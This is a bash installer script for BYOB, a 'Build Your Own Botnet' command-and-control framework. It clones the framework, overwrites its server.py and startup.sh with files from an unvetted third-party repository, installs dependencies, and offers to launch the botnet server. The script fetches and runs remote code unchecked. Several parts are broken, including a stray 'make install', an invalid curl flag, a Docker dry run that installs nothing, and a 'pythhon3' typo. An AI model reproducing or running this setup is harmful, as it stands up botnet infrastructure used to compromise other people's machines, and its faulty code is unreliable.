#!/usr/bin/env bash

while true;do
	read -p "Do you wish to install BYOB? [(y)es/(n)o] " yn
		case $yn in [Yy]* ) make install; break;;
		[Nn]* ) exit;; * ) echo "Please answer [y]es or [n]o.";;
	esac
 done


echo "This script will install BYOB aswell as all pakages"
echo ""
echo "script will start in 10 secunds, press CTRL + C to cancel"

echo "Hello, who am I talking to?"
echo "pls enter username"
read name
echo "It's nice to meet you $name"
echo "you can relax now, but pls stay at your pc"
echo "you might have to enter your passwort for sudo"

sleep 10

echo "updating all pakages"

apt update -y && apt upgrade -y
apt install sudo -y
sudo apt update -y && sudo apt upgrade -y

echo ""
echo "installing basic pakages"
echo ""

sudo apt install git -y
sudo apt install curl -y

echo ""
echo "updating server.py"
echo ""

#made my own git cuz of the error that is in line 90

cd /home/$name/
git clone https://github.com/FforFixed/server.py.git
git clone https://github.com/malwaredllc/byob
cd /home/$name/byob/
cd /home/$name/byob/web-gui/
cd /home/$name/byob/web-gui/buildyourownbotnet/
rm server.py
cd /home/$name/
cd /home/$name/server.py/
cp server.py /home/$name/byob/web-gui/buildyourownbotnet/

cd /home/$name/
cd /home/$name/byob/web-gui/
rm startup.sh
cd /home/$name/
cd /home/$name/server.py/
cp startup.sh /home/$name/byob/web-gui/


echo ""
echo "installing docker"
echo ""

#thats the convinience script

curl -fsSL https://get.docker.com -o get-docker.sh -y
DRY_RUN=1 sh ./get-docker.sh

echo ""
echo "installing python + python pakages"
echo ""

sudo apt install python3 -y
sudo apt install python3-pip -y
pip install flask
pip install flask_session
pip install flask_wtf
pip install Flask_SQLAlchemy
pip install Flask_Login
pip install Flask_Bcrypt
pip install flask_mail
pip install wtforms

cd /home/$name/
cd /home/$name/byob/web-gui/
chmod u+x startup.sh

echo ""
echo "the offical startup script will run NOW"
echo "THIS MAY TAKE SOME TIME SO PLS DONT EXIT THE SCRIPT"
echo ""

./startup.sh

read -p "Do you want to start BYOB? [yes/no]" yn

case $yn in 
	yes ) echo byob will start;
		pythhon3 run.py;;
	no ) ;;
	* ) echo invalid response;
		exit 1;;
esac

echo ""
echo "if some error accured pls look it up on the internet"
echo ""
echo ""
